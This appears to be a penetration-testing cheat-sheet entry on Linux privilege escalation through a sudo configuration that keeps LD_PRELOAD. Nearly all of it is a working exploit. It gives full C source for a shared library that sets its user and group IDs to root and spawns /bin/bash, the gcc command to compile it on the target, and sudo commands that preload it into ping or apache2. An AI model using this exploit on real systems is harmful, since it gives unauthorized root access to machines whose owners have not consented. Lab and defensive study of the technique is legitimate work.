# LD_PRELOAD

when running `sudo -l` we see the following included in the output:

```
env_keep+=LD_PRELOAD
```

With this included, we can privesc with any sudo command via the following

shell.c

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");
	setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

We compile it on the target

```bash
gcc -fPIC -shared -o /tmp/shell.so shell.c -nostartfiles
```

Examples:

```
# ping
sudo LD_PRELOAD=/tmp/shell.so ping

# apache2
sudo LD_PRELOAD=/tmp/shell.so apache2 restart
```
